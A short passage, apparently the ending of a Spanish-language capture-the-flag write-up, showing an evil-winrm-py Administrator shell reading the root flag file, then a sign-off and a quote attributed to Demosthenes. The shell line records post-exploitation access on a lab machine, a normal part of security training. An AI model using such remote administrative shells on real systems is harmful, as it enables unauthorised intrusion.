evil-winrm-py PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
922...
~~~

Gracias por leer, a continuación te dejo la cita del día.

> Small opportunities are often the beginning of great enterprises.
> — Demosthenes
{: .notice--info}
